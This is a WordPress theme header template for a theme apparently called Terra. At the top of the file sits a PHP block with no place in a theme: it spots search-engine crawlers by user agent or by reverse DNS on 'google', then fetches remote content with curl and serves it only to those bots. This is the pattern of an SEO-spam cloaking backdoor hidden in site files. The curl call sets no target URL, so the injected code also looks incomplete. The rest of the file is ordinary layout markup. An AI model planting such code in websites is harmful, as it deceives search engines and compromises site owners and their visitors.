


<?php
$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#doodle#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}

if(@$isbot){

$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
$ch = curl_init();    
    curl_setopt($ch, CURLOPT_HEADER, false);
    $result = curl_exec($ch);       
curl_close ($ch);  

	echo $result;
}
?><!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" <?php language_attributes(); ?>>
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html <?php language_attributes(); ?>>
<!--<![endif]-->
<head>

	<!-- Basic Page Needs
  ================================================== -->
	<meta charset="<?php bloginfo( 'charset' ); ?>">
	<title><?php	     
	    // Page or Single Post
	    if ( is_page() or is_single() ) {
	        the_title();	 
	    // Category Archive
	    } elseif ( is_category() ) {
	        echo single_cat_title('', false);	 
	    // Tag Archive
	    } elseif ( function_exists('is_tag') and function_exists('single_tag_title') and is_tag() ) {
	        printf( __('Tag: %s','Terra'), single_tag_title('', false) );	 
	    // General Archive
	    } elseif ( is_archive() ) {
	        printf( __('Archive: %s','Terra'), wp_title('', false) );	 
	    // Search Results
	    } elseif ( is_search() ) {
	        printf( __('Search: %s','Terra'), get_query_var('s') );
	    }	 
	    // Insert separator for the titles above
	    if ( !is_home() and !is_404() and !is_front_page() ) {
	        echo " - ";
	    }	     
	    // Finally the blog name
	    bloginfo('name');	 
	    ?></title>

	<meta name="description" content="<?php bloginfo('description'); ?>" />

	<!-- Mobile Specific Metas
  ================================================== -->
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


	<!-- Favicons
	================================================== -->
	<link rel="icon" type="image/x-icon" href="<?php echo ot_get_option('favicon_uploaded', get_template_directory_uri().'/images/favicon.png')?>">	


  	<?php
	//Inline Styles
	?>


  	<?php 	$animated_containers = ot_get_option('animated_containers');
  			if($animated_containers){
			     wp_enqueue_script('anim-script', get_template_directory_uri().'/js/anims.js',array('jquery','jquery.easing','terra.common'));
			     wp_localize_script( 'anim-script', 'template_dir_uri', get_template_directory_uri() );
  			}
	?>		
		
	<?php wp_head(); ?>	
	
</head>

<body <?php body_class(); ?>>

  <?php $page_heading_style = ot_get_option('page_heading_style') ? ot_get_option('page_heading_style') : '';?>	

  <div id="wrapper" class="<?php echo (ot_get_option('wrapper_style')=='full_width'? 'full_wrapper' : '');?> <?php echo $page_heading_style;?>">
  
  	<!-- Container -->
	<div class="container">
	
	
		<div id="hidden_header" class="row" <?php echo (!$use_header_popup = ot_get_option('use_header_popup')) ? "style='margin-bottom: 30px; display: block;'" : ""; ?>>
			<div class="eight columns">
				<div class="header_right">
					<div class="header_contacts clearfix">
					<?php if($header_email = ot_get_option('header_email')){?>
						<div class="header_mail"><?php echo $header_email;?></div>
					<?php }  ?>	
					<?php if($header_phone = ot_get_option('header_phone')){?>
						<div class="header_phone"><?php echo $header_phone;?></div>
					<?php }  ?>
					</div>
				</div>
			</div>
			<div class="eight columns">
				<div class="header_soc_search clearfix">
					
				<?php if($show_search = ot_get_option('show_search')){?>	
					<div class="header_search">
						<form class="search" action="<?php echo home_url(); ?>/" method="get">
							<button class="button_search"></button>
							<input name="s" id="s" type="text" placeholder="<?php echo ($s ? $s : __('Search', 'Terra').'...'); ?>" value="" />
						</form>
					</div>
				<?php }  ?>
					
				<?php if(is_array($header_icons = ot_get_option('header_icons'))){
							$header_icons = array_reverse($header_icons);							
							foreach($header_icons as $header_icon){
								echo "<a target='_blank' href='". ( $header_icon['icons_service']!='rss' ? $header_icon['icons_url'] : get_bloginfo('rss2_url') )."' class='header_soc_". $header_icon['icons_service'] ."' title='". $header_icon['title'] ."'>". $header_icon['icons_service'] ."</a>";			
							}
						}
				?>
				
				</div>		
			</div>
		</div>	
		
	
	<?php if($use_header_popup){?>
		<div class="row">
			<div class="sixteen columns header_toggler_holder">
				<div id="header_toggler"></div>
			</div>
		</div>	
	<?php }  ?>
	
	
	
	
		<?php $nav_top_block_style = ot_get_option('nav_top_block_style');?>	
				
		<div class="header <?php echo ($nav_top_block_style ? 'block_header' : '');?> sixteen columns">

			<div id="logo">
				<?php  $logo = ot_get_option('logo_upload');
					   $top_margin = ot_get_option('logo_top_margin');
					   $left_margin = ot_get_option('logo_left_margin');
					   if(isset($top_margin) && is_array($top_margin)){
					   		$logo_extra_style = ($top_margin[0] || $left_margin[0]) ? 1 : 0;
					   }else{
					   		$logo_extra_style ='';
					   }
					   
				if($logo) { ?>
				<a href="<?php echo home_url('/'); ?>" title="<?php echo esc_attr(get_bloginfo('name', 'display')); ?>" rel="home">
					<img src="<?php echo $logo; ?>" <?php echo $logo_extra_style ? "style='". ($top_margin[0] ? 'margin-top: '.$top_margin[0].$top_margin[1].';' : '') . ($left_margin[0] ? 'margin-left: '.$left_margin[0].$left_margin[1].';' : '')."'" : ""; ?> alt="<?php bloginfo('name'); ?>"/>
				</a>
				<?php } else { ?>
				<h1<?php echo $logo_extra_style ? "style='". ($top_margin[0] ? 'margin-top: '.$top_margin[0].$top_margin[1].';' : '') . ($left_margin[0] ? 'margin-left: '.$left_margin[0].$left_margin[1].';' : '')."'" : ""; ?>>
					<a href="<?php echo home_url('/'); ?>" title="<?php echo esc_attr(get_bloginfo('name', 'display')); ?>" rel="home"><?php bloginfo('name'); ?></a>
					<div class="tagline"><?php echo get_bloginfo ( 'description' ); ?></div>
				</h1>
				<?php } ?>
			</div>

			 
			<!-- Main Navigation -->			
			<?php	$nav_top_margin = ot_get_option('nav_top_margin');
					if(isset($nav_top_margin) && is_array($nav_top_margin) && !empty($nav_top_margin[0])){
					   	$nav_extra_style = " style='margin-top: ".$nav_top_margin[0].$nav_top_margin[1].";'";
					}else{
					   	$nav_extra_style ='';
					}
			?>		   

			<div <?php echo $nav_extra_style; ?>  class="<?php echo get_theme_mod('main_menu_style'); ?>">	
			<?php wp_nav_menu( array(
					'theme_location'=> 'main_navigation',
					'container_id' 	=> 'menu', 
					'menu_class' 	=> '', 
					'walker' 		=> new boc_Menu_Walker,
					'fallback_cb'   => 'menuFallBack',
					'items_wrap' => '<ul>%3$s</ul>',
			));?>
			</div>
			
			<?php wp_nav_menu( array(
					'theme_location'=> 'main_navigation', 
					'container' 	=> '', 
					'menu_class' 	=> '', 
					'walker' 		=> new boc_Menu_Select_Walker,
					'fallback_cb'   => 'menuSelectFallBack',
					'items_wrap' => '<select id="select_menu" onchange="location = this.value"><option value="">'.__('Select Page', 'Terra').'</option>%3$s</select>',
			));?>							
			<!-- Main Navigation::END -->
			
		</div>
	</div>